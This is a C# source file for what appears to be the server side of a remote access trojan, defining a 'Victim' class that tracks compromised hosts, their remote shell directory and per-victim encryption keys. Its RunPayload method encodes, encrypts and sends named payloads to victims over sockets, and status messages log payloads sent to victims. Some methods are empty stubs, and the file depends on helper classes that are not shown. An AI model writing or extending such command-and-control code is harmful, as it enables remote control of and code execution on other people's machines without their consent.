using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Data.Entity.Core.Mapping;

#pragma warning disable CS8602

public class Victim
{
    public Socket socket;
    public int MAX_BUFFER_LENGTH = 65536;
    public byte[] buffer = new byte[65536];
    public string ID;
    public string rAddr; //Remote address.
    public int rPort; //Remote port.
    public string shell_cd; //SHELL CURRENT DIR
    public bool unix_like;
    public bool remote_conntect;

    //CRYPTOGRAPHY
    public (string PublicKey, string PrivateKey) KeyPairs;
    public (byte[] Key, byte[] IV) _AES;

    //RECEIVE EVENTS
    public delegate void ReceivedEventHandler(Victim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec);
    public event ReceivedEventHandler Received;
    public delegate void DisconnectedEventHandler(Victim v);
    public event DisconnectedEventHandler Disconnected;

    public Victim(Socket socket)
    {
        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        this.socket = socket;
        rAddr = split[0];
        rPort = int.Parse(split[1]);
    }
    public Victim(string ip, int port)
    {
        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
        sock.BeginConnect(ep, new AsyncCallback(ConnectCallback), sock);
    }

    public void Send(int Command, int Param, byte[] buffer)
    {
        if (buffer != null)
        {
            try
            {
                byte _command = (byte)Command;
                byte _param = (byte)Param;
                buffer = new RP(_command, _param, buffer).GetBytes();
                C2.sent += buffer.Length;
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch
                    {
                        MessageBox.Show("OH SHIT!");
                    }
                }), buffer);
            }
            catch (Exception ex)
            {
                MessageBox.Show("OH SHIT!");
            }
        }
    }
    public void Send(int Command, int Param, string szMsg)
    {
        Send(Command, Param, Encoding.UTF8.GetBytes(szMsg));
    }

    public void ConnectCallback(IAsyncResult ar)
    {
        try
        {
            Socket sock = (Socket)ar.AsyncState;
            if (sock == null)
                return;

            sock.EndConnect(ar);

            byte cmd = 1;
            byte param = 0;
            byte[] buf = new RP(cmd, param, Encoding.UTF8.GetBytes("")).GetBytes();
            sock.BeginSend(buf, 0, buf.Length, SocketFlags.None, new AsyncCallback(SendCallBack), sock);
        }
        catch (Exception ex)
        {

        }
    }
    private void SendCallBack(IAsyncResult ar)
    {
        try
        {
            Socket sock = (Socket)ar.AsyncState;
            Victim v = new Victim(sock);
            sock.EndSend(ar);
            sock.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallback), v);
        }
        catch (Exception ex)
        {

        }
    }
    private void ReadCallback(IAsyncResult ar)
    {
        Victim v = (Victim)ar.AsyncState;
        try
        {
            Socket sock = v.socket;
            RP rp = null;
            int recv_len = 0;
        }
        catch (Exception ex)
        {

        }
    }

    public void RunPayload(string name, Victim v, string[] para = null)
    {
        string class_str = C1.GetPayload(name);
        string payload = $"{name}|{Encoding.UTF8.GetString(C1.StrE2B64Byte(class_str))}";
        if (para != null)
            payload += "|" + string.Join("|", para);
        payload = Crypto.AESEncrypt(payload, v._AES.Key, v._AES.IV);
        byte[] buffer = Encoding.UTF8.GetBytes(payload);
        v.Send(2, 0, buffer);

        C2.form1.TransportStatus($"Sent payload[{name}] to {v.ID}, size : {buffer.Length}");
    }

    public void Reconnect()
    {

    }

    public void Disconnect(bool delete)
    {

    }
}